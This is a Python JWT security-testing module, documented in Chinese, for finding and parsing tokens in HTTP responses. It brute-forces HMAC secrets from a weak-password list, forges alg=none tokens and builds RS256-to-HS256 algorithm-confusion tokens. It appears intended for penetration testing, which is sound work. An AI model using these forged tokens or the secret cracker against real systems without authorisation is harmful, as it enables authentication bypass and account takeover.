"""
JWT 安全检测引擎

提供 JWT 识别、解析、弱密钥爆破、漏洞检测等安全测试功能。
"""

import re
import json
import base64
import logging
import hmac
import hashlib
from typing import Dict, List, Optional, Any
from concurrent.futures import ThreadPoolExecutor, as_completed

import jwt
from jwt.exceptions import InvalidSignatureError, DecodeError, InvalidTokenError

from .sensitive_detector import SensitiveDetector


logger = logging.getLogger(__name__)


class JWTDetector:
    """JWT 安全检测引擎"""

    JWT_PATTERN = r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*'

    DEFAULT_WEAK_SECRETS = [
        "secret",
        "password",
        "123456",
        "admin",
        "key",
        "jwt_secret",
        "your-256-bit-secret",
        "my_secret_key",
        "secret_key",
        "",
        "jwt",
        "token",
        "auth",
        "authentication",
        "pass",
        "passwd",
        "root",
        "administrator",
        "qwerty",
        "abc123",
        "letmein",
        "welcome",
        "monkey",
        "dragon",
        "master",
        "login",
        "super",
        "supersecret",
        "secret123",
        "password123",
    ]

    def __init__(
        self,
        weak_secrets: Optional[List[str]] = None,
        wordlist_file: Optional[str] = None,
        sensitive_detector: Optional[SensitiveDetector] = None,
        max_workers: int = 4
    ):
        """
        初始化 JWT 检测引擎

        Args:
            weak_secrets: 自定义弱密钥列表
            wordlist_file: 弱密钥字典文件路径
            sensitive_detector: 敏感信息检测器实例
            max_workers: 并行爆破的最大线程数
        """
        self.weak_secrets = list(self.DEFAULT_WEAK_SECRETS)
        if weak_secrets:
            self.weak_secrets.extend(weak_secrets)
        
        if wordlist_file:
            self._load_wordlist(wordlist_file)
        
        self.sensitive_detector = sensitive_detector or SensitiveDetector()
        self.max_workers = max_workers
        self._jwt_regex = re.compile(self.JWT_PATTERN)
        
        logger.info(f"JWTDetector 初始化完成，弱密钥数量: {len(self.weak_secrets)}")

    def _load_wordlist(self, file_path: str) -> None:
        """
        从文件加载弱密钥字典

        Args:
            file_path: 字典文件路径
        """
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    secret = line.strip()
                    if secret and secret not in self.weak_secrets:
                        self.weak_secrets.append(secret)
            logger.info(f"从文件加载弱密钥: {file_path}, 总数: {len(self.weak_secrets)}")
        except Exception as e:
            logger.warning(f"加载弱密钥字典失败: {file_path}, 错误: {e}")

    def detect_jwt(self, text: str) -> List[str]:
        """
        从文本中识别 JWT

        Args:
            text: 待检测文本

        Returns:
            检测到的 JWT 列表
        """
        if not text:
            return []
        
        matches = self._jwt_regex.findall(text)
        valid_tokens = []
        
        for token in matches:
            if self._is_valid_jwt_format(token):
                valid_tokens.append(token)
        
        logger.info(f"检测到 {len(valid_tokens)} 个有效 JWT")
        return valid_tokens

    def _is_valid_jwt_format(self, token: str) -> bool:
        """
        验证 JWT 格式是否有效

        Args:
            token: JWT 字符串

        Returns:
            是否为有效的 JWT 格式
        """
        parts = token.split('.')
        if len(parts) < 2:
            return False
        
        try:
            for part in parts[:2]:
                padding = 4 - len(part) % 4
                if padding != 4:
                    part += '=' * padding
                base64.urlsafe_b64decode(part)
            return True
        except Exception:
            return False

    def _base64url_decode(self, data: str) -> str:
        """
        Base64 URL 安全解码

        Args:
            data: Base64 URL 编码的字符串

        Returns:
            解码后的字符串
        """
        padding = 4 - len(data) % 4
        if padding != 4:
            data += '=' * padding
        decoded = base64.urlsafe_b64decode(data)
        return decoded.decode('utf-8', errors='replace')

    def parse_jwt(self, token: str) -> Dict[str, Any]:
        """
        解析 JWT（Header, Payload, Signature）

        Args:
            token: JWT 字符串

        Returns:
            包含 header, payload, signature 的字典
        """
        result = {
            "token": token,
            "header": {},
            "payload": {},
            "signature": "",
            "valid": False,
            "error": None
        }
        
        try:
            parts = token.split('.')
            
            if len(parts) >= 1:
                header_json = self._base64url_decode(parts[0])
                result["header"] = json.loads(header_json)
            
            if len(parts) >= 2:
                payload_json = self._base64url_decode(parts[1])
                result["payload"] = json.loads(payload_json)
            
            if len(parts) >= 3:
                result["signature"] = parts[2]
            
            result["valid"] = True
            
        except json.JSONDecodeError as e:
            result["error"] = f"JSON 解析错误: {str(e)}"
        except Exception as e:
            result["error"] = f"解析错误: {str(e)}"
        
        return result

    def crack_weak_secret(
        self,
        token: str,
        wordlist: Optional[List[str]] = None,
        algorithms: Optional[List[str]] = None
    ) -> Optional[str]:
        """
        爆破弱密钥

        Args:
            token: JWT 字符串
            wordlist: 自定义密钥字典，为 None 则使用默认字典
            algorithms: 要测试的算法列表

        Returns:
            破解成功的密钥，失败返回 None
        """
        secrets = wordlist or self.weak_secrets
        if algorithms is None:
            algorithms = ["HS256", "HS384", "HS512"]
        
        parsed = self.parse_jwt(token)
        if not parsed["valid"]:
            logger.warning("JWT 格式无效，无法爆破")
            return None
        
        token_alg = parsed["header"].get("alg", "HS256")
        if token_alg.upper() in ["HS256", "HS384", "HS512"]:
            algorithms = [token_alg]
        
        def try_decode(secret: str) -> Optional[str]:
            for alg in algorithms:
                try:
                    jwt.decode(token, secret, algorithms=[alg])
                    return secret
                except InvalidSignatureError:
                    continue
                except Exception:
                    continue
            return None

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = {executor.submit(try_decode, secret): secret for secret in secrets}
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        logger.info(f"成功破解 JWT 密钥: {result}")
                        return result
                except Exception as e:
                    logger.debug(f"爆破异常: {e}")
        
        logger.info("JWT 弱密钥爆破失败")
        return None

    def test_alg_none(self, token: str) -> Dict[str, Any]:
        """
        测试 alg: none 漏洞

        Args:
            token: JWT 字符串

        Returns:
            测试结果字典
        """
        result = {
            "vulnerable": False,
            "original_token": token,
            "modified_tokens": [],
            "description": "测试服务器是否接受 alg=none 的 JWT"
        }
        
        parsed = self.parse_jwt(token)
        if not parsed["valid"]:
            result["error"] = "JWT 格式无效"
            return result
        
        header = parsed["header"]
        payload = parsed["payload"]
        
        for alg_value in ["none", "None", "NONE"]:
            modified_header = header.copy()
            modified_header["alg"] = alg_value
            
            try:
                header_json = json.dumps(modified_header, separators=(',', ':'))
                payload_json = json.dumps(payload, separators=(',', ':'))
                
                header_b64 = base64.urlsafe_b64encode(header_json.encode()).rstrip(b'=').decode()
                payload_b64 = base64.urlsafe_b64encode(payload_json.encode()).rstrip(b'=').decode()
                
                modified_token = f"{header_b64}.{payload_b64}."
                
                result["modified_tokens"].append({
                    "alg": alg_value,
                    "token": modified_token
                })
            except Exception as e:
                logger.debug(f"构造 alg=none token 失败: {e}")
        
        result["vulnerable"] = len(result["modified_tokens"]) > 0
        result["test_instructions"] = (
            "请将生成的 modified_tokens 发送到服务器，"
            "如果服务器接受这些 token，则存在 alg=none 漏洞"
        )
        
        return result

    def test_algorithm_confusion(
        self,
        token: str,
        public_key: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        测试 RS256 → HS256 算法混淆漏洞

        Args:
            token: JWT 字符串
            public_key: RSA 公钥（PEM 格式）

        Returns:
            测试结果字典
        """
        result = {
            "vulnerable": False,
            "original_token": token,
            "modified_token": None,
            "description": "测试服务器是否接受算法混淆攻击（RS256 → HS256）",
            "public_key_required": public_key is None
        }
        
        parsed = self.parse_jwt(token)
        if not parsed["valid"]:
            result["error"] = "JWT 格式无效"
            return result
        
        header = parsed["header"]
        original_alg = header.get("alg", "")
        
        if not original_alg.upper().startswith("RS"):
            result["error"] = f"原始算法不是 RSA 类型: {original_alg}"
            return result
        
        if not public_key:
            result["error"] = "需要提供 RSA 公钥进行算法混淆测试"
            result["test_instructions"] = (
                "请提供 RSA 公钥（PEM 格式），工具将使用公钥作为 HMAC 密钥，"
                "将算法从 RS256 改为 HS256 来测试算法混淆漏洞"
            )
            return result
        
        try:
            modified_header = header.copy()
            if original_alg.upper() == "RS256":
                modified_header["alg"] = "HS256"
            elif original_alg.upper() == "RS384":
                modified_header["alg"] = "HS384"
            elif original_alg.upper() == "RS512":
                modified_header["alg"] = "HS512"
            else:
                modified_header["alg"] = "HS256"
            
            header_json = json.dumps(modified_header, separators=(',', ':'))
            payload_json = json.dumps(parsed["payload"], separators=(',', ':'))
            
            header_b64 = base64.urlsafe_b64encode(header_json.encode()).rstrip(b'=').decode()
            payload_b64 = base64.urlsafe_b64encode(payload_json.encode()).rstrip(b'=').decode()
            
            signing_input = f"{header_b64}.{payload_b64}"
            
            if modified_header["alg"] == "HS256":
                signature = hmac.new(
                    public_key.encode(),
                    signing_input.encode(),
                    hashlib.sha256
                ).digest()
            elif modified_header["alg"] == "HS384":
                signature = hmac.new(
                    public_key.encode(),
                    signing_input.encode(),
                    hashlib.sha384
                ).digest()
            elif modified_header["alg"] == "HS512":
                signature = hmac.new(
                    public_key.encode(),
                    signing_input.encode(),
                    hashlib.sha512
                ).digest()
            else:
                signature = hmac.new(
                    public_key.encode(),
                    signing_input.encode(),
                    hashlib.sha256
                ).digest()
            
            signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
            modified_token = f"{signing_input}.{signature_b64}"
            
            result["modified_token"] = modified_token
            result["vulnerable"] = True
            result["test_instructions"] = (
                "请将 modified_token 发送到服务器，"
                "如果服务器接受该 token，则存在算法混淆漏洞"
            )
            
        except Exception as e:
            result["error"] = f"构造算法混淆 token 失败: {str(e)}"
        
        return result

    def detect_sensitive_info(self, payload: Dict) -> List[Dict]:
        """
        检测 Payload 中的敏感信息

        Args:
            payload: JWT Payload 字典

        Returns:
            检测到的敏感信息列表
        """
        results = []
        
        if not payload:
            return results
        
        sensitive_keys = {
            "password": {"level": "High", "description": "密码字段"},
            "passwd": {"level": "High", "description": "密码字段"},
            "pwd": {"level": "High", "description": "密码字段"},
            "secret": {"level": "High", "description": "密钥字段"},
            "secret_key": {"level": "High", "description": "密钥字段"},
            "api_key": {"level": "High", "description": "API 密钥"},
            "apikey": {"level": "High", "description": "API 密钥"},
            "token": {"level": "Medium", "description": "令牌字段"},
            "access_token": {"level": "High", "description": "访问令牌"},
            "refresh_token": {"level": "High", "description": "刷新令牌"},
            "private_key": {"level": "High", "description": "私钥"},
            "privatekey": {"level": "High", "description": "私钥"},
            "credit_card": {"level": "High", "description": "信用卡信息"},
            "card_number": {"level": "High", "description": "卡号"},
            "ssn": {"level": "High", "description": "社会安全号"},
            "social_security": {"level": "High", "description": "社会安全号"},
            "email": {"level": "Medium", "description": "邮箱地址"},
            "phone": {"level": "Medium", "description": "电话号码"},
            "mobile": {"level": "Medium", "description": "手机号码"},
            "address": {"level": "Low", "description": "地址信息"},
            "name": {"level": "Low", "description": "姓名"},
            "username": {"level": "Medium", "description": "用户名"},
            "user_id": {"level": "Low", "description": "用户ID"},
            "userid": {"level": "Low", "description": "用户ID"},
            "id_number": {"level": "High", "description": "身份证号"},
            "idnumber": {"level": "High", "description": "身份证号"},
        }
        
        payload_str = json.dumps(payload)
        sensitive_results = self.sensitive_detector.detect(payload_str)
        
        for info in sensitive_results:
            results.append({
                "type": "regex_match",
                "rule_name": info.rule_name,
                "level": info.rule_level,
                "matched_content": info.matched_content,
                "description": f"正则匹配: {info.rule_name}"
            })
        
        for key, value in payload.items():
            key_lower = key.lower()
            for sensitive_key, info in sensitive_keys.items():
                if sensitive_key in key_lower:
                    results.append({
                        "type": "key_match",
                        "key": key,
                        "level": info["level"],
                        "value_preview": str(value)[:50] if value else "",
                        "description": info["description"]
                    })
                    break
        
        logger.info(f"检测到 {len(results)} 个敏感信息")
        return results

    def analyze_jwt(self, token: str, public_key: Optional[str] = None) -> Dict[str, Any]:
        """
        分析 JWT 安全性

        Args:
            token: JWT 字符串
            public_key: RSA 公钥（用于算法混淆测试）

        Returns:
            安全分析结果字典
        """
        result = {
            "token": token,
            "parsed": None,
            "security_issues": [],
            "sensitive_info": [],
            "weak_secret": None,
            "alg_none_test": None,
            "algorithm_confusion_test": None,
            "risk_level": "Low"
        }
        
        parsed = self.parse_jwt(token)
        result["parsed"] = parsed
        
        if not parsed["valid"]:
            result["security_issues"].append({
                "type": "parse_error",
                "level": "High",
                "description": f"JWT 解析失败: {parsed.get('error', '未知错误')}"
            })
            result["risk_level"] = "High"
            return result
        
        header = parsed["header"]
        payload = parsed["payload"]
        
        alg = header.get("alg", "")
        if alg.lower() == "none":
            result["security_issues"].append({
                "type": "weak_algorithm",
                "level": "High",
                "description": "JWT 使用 alg=none，无签名验证"
            })
            result["risk_level"] = "High"
        
        if alg.upper() in ["HS256", "HS384", "HS512"]:
            weak_secret = self.crack_weak_secret(token)
            if weak_secret:
                result["weak_secret"] = weak_secret
                result["security_issues"].append({
                    "type": "weak_secret",
                    "level": "High",
                    "description": f"检测到弱密钥: {weak_secret}"
                })
                result["risk_level"] = "High"
        
        alg_none_result = self.test_alg_none(token)
        result["alg_none_test"] = alg_none_result
        if alg_none_result.get("modified_tokens"):
            result["security_issues"].append({
                "type": "alg_none_vulnerable",
                "level": "High",
                "description": "可能存在 alg=none 漏洞"
            })
        
        if public_key or alg.upper().startswith("RS"):
            confusion_result = self.test_algorithm_confusion(token, public_key)
            result["algorithm_confusion_test"] = confusion_result
            if confusion_result.get("modified_token"):
                result["security_issues"].append({
                    "type": "algorithm_confusion",
                    "level": "High",
                    "description": "可能存在算法混淆漏洞"
                })
        
        sensitive_info = self.detect_sensitive_info(payload)
        result["sensitive_info"] = sensitive_info
        if any(info["level"] == "High" for info in sensitive_info):
            if result["risk_level"] != "High":
                result["risk_level"] = "Medium"
        
        if not result["security_issues"]:
            result["security_issues"].append({
                "type": "no_issues_found",
                "level": "Info",
                "description": "未发现明显安全问题"
            })
        
        return result

    def scan_response(
        self,
        response_body: str,
        response_headers: Optional[Dict[str, str]] = None
    ) -> List[Dict]:
        """
        扫描响应中的 JWT

        Args:
            response_body: 响应体内容
            response_headers: 响应头字典

        Returns:
            JWT 分析结果列表
        """
        results = []
        
        tokens = self.detect_jwt(response_body)
        
        if response_headers:
            for header_name, header_value in response_headers.items():
                header_tokens = self.detect_jwt(header_value)
                for token in header_tokens:
                    if token not in tokens:
                        tokens.append(token)
        
        for token in tokens:
            analysis = self.analyze_jwt(token)
            analysis["source"] = "response"
            results.append(analysis)
        
        logger.info(f"扫描完成，发现 {len(results)} 个 JWT")
        return results

    def add_weak_secrets(self, secrets: List[str]) -> None:
        """
        添加自定义弱密钥

        Args:
            secrets: 弱密钥列表
        """
        for secret in secrets:
            if secret not in self.weak_secrets:
                self.weak_secrets.append(secret)
        logger.info(f"添加弱密钥，当前总数: {len(self.weak_secrets)}")

    def get_weak_secrets(self) -> List[str]:
        """
        获取当前弱密钥列表

        Returns:
            弱密钥列表
        """
        return list(self.weak_secrets)
